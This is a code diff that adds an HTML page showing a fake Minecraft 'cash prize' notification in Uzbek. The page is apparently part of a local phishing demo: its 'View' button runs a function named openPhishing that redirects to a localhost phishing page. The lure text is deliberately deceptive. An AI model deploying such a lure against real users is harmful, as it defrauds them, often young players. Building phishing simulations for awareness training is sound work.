@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Notification</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: #1a1a2e;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: flex-end;
+      justify-content: flex-end;
+      padding: 24px;
+      font-family: 'Segoe UI', sans-serif;
+      overflow: hidden;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(ellipse at 20% 50%, rgba(0,100,30,.15) 0%, transparent 50%),
+        radial-gradient(ellipse at 80% 20%, rgba(0,30,100,.2) 0%, transparent 50%),
+        linear-gradient(180deg, #0d1117 0%, #1a1a2e 100%);
+      z-index: 0;
+    }
+
+    /* Fake game label */
+    body::after {
+      content: 'MINECRAFT';
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 5rem;
+      font-weight: 900;
+      color: rgba(255,255,255,.025);
+      letter-spacing: 8px;
+      z-index: 0;
+      user-select: none;
+    }
+
+    /* Waiting indicator */
+    .waiting {
+      position: fixed;
+      bottom: 16px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: .72rem;
+      color: rgba(255,255,255,.15);
+      z-index: 5;
+      font-family: 'Courier New', monospace;
+    }
+
+    .dot {
+      width: 5px; height: 5px;
+      border-radius: 50%;
+      background: rgba(0,200,83,.3);
+      animation: blink 1.4s infinite;
+    }
+    .dot:nth-child(2) { animation-delay: .2s; }
+    .dot:nth-child(3) { animation-delay: .4s; }
+    @keyframes blink { 0%,80%,100%{opacity:.2} 40%{opacity:1} }
+
+    /* Notification */
+    .notif {
+      position: relative;
+      z-index: 10;
+      width: 360px;
+      background: #1e1e1e;
+      border: 1px solid #2a2a2a;
+      border-left: 3px solid #00c853;
+      border-radius: 8px;
+      padding: 14px 16px;
+      box-shadow: 0 8px 32px rgba(0,0,0,.7), 0 0 0 1px rgba(0,200,83,.1);
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+      cursor: pointer;
+      transform: translateX(420px);
+      opacity: 0;
+      transition: transform .45s cubic-bezier(.175,.885,.32,1.275), opacity .3s;
+    }
+
+    .notif.show {
+      transform: translateX(0);
+      opacity: 1;
+    }
+
+    .notif:hover {
+      border-left-color: #69f0ae;
+      background: #242424;
+    }
+
+    .notif-icon {
+      width: 40px; height: 40px;
+      border-radius: 8px;
+      background: linear-gradient(135deg, #1b5e20, #2e7d32);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.4rem;
+      flex-shrink: 0;
+    }
+
+    .notif-body { flex: 1; }
+
+    .notif-app {
+      font-size: .7rem;
+      color: #777;
+      text-transform: uppercase;
+      letter-spacing: .8px;
+      margin-bottom: 3px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .pulse {
+      width: 6px; height: 6px;
+      border-radius: 50%;
+      background: #00c853;
+      animation: pulse 1.2s infinite;
+    }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
+
+    .notif-title {
+      font-size: .95rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 4px;
+    }
+
+    .notif-text {
+      font-size: .8rem;
+      color: #aaa;
+      line-height: 1.4;
+    }
+
+    .notif-actions {
+      display: flex;
+      gap: 8px;
+      margin-top: 10px;
+    }
+
+    .btn-view {
+      background: #00c853;
+      color: #000;
+      border: none;
+      padding: 5px 14px;
+      border-radius: 4px;
+      font-size: .78rem;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+      transition: background .15s;
+    }
+    .btn-view:hover { background: #69f0ae; }
+
+    .btn-dismiss {
+      background: transparent;
+      color: #666;
+      border: 1px solid #333;
+      padding: 5px 12px;
+      border-radius: 4px;
+      font-size: .78rem;
+      cursor: pointer;
+      font-family: inherit;
+      transition: all .15s;
+    }
+    .btn-dismiss:hover { border-color: #666; color: #aaa; }
+
+    .notif-time {
+      position: absolute;
+      top: 10px; right: 12px;
+      font-size: .68rem;
+      color: #444;
+    }
+
+    /* Sound wave animation when notification arrives */
+    @keyframes ring {
+      0%,100% { transform: rotate(0deg); }
+      20%     { transform: rotate(-15deg); }
+      40%     { transform: rotate(15deg); }
+      60%     { transform: rotate(-8deg); }
+      80%     { transform: rotate(8deg); }
+    }
+    .notif.show .notif-icon { animation: ring .5s ease .1s; }
+  </style>
+</head>
+<body>
+
+<div class="waiting">
+  <div class="dot"></div>
+  <div class="dot"></div>
+  <div class="dot"></div>
+</div>
+
+<div class="notif" id="notif">
+  <div class="notif-icon">🎮</div>
+  <div class="notif-body">
+    <div class="notif-app"><span class="pulse"></span>Minecraft Server Events</div>
+    <div class="notif-title">🏆 Tabriklaymiz, o'yinchi!</div>
+    <div class="notif-text">
+      Siz <strong style="color:#ffd600;">pul mukofotiga</strong> ega bo'ldingiz.<br>
+      Mukofotingizni darhol qo'lga kiriting!
+    </div>
+    <div class="notif-actions">
+      <button class="btn-view" onclick="openPhishing(); event.stopPropagation()">Ko'rish</button>
+      <button class="btn-dismiss" onclick="dismiss(); event.stopPropagation()">Keyinroq</button>
+    </div>
+  </div>
+  <div class="notif-time" id="notifTime"></div>
+</div>
+
+<script>
+const API = 'http://localhost:8001';
+let shown = false;
+
+async function checkTrigger() {
+  try {
+    const res  = await fetch(`${API}/api/notification-status`);
+    const data = await res.json();
+    if (data.triggered && !shown) {
+      shown = true;
+      showNotification();
+      // ACK qilamiz — qayta ko'rinmasin
+      await fetch(`${API}/api/notification-ack`, { method: 'POST' });
+    }
+  } catch (_) {}
+}
+
+function showNotification() {
+  document.getElementById('notifTime').textContent =
+    new Date().toLocaleTimeString('uz-UZ', { hour: '2-digit', minute: '2-digit' });
+  document.getElementById('notif').classList.add('show');
+  document.querySelector('.waiting').style.display = 'none';
+}
+
+function openPhishing() {
+  window.location.href = `${API}/phishing`;
+}
+
+function dismiss() {
+  const n = document.getElementById('notif');
+  n.style.transition = 'transform .3s ease, opacity .3s';
+  n.style.transform  = 'translateX(420px)';
+  n.style.opacity    = '0';
+}
+
+// Har 1.5 sekundda tekshiradi
+setInterval(checkTrigger, 1500);
+checkTrigger();
+</script>
+
+</body>
+</html>
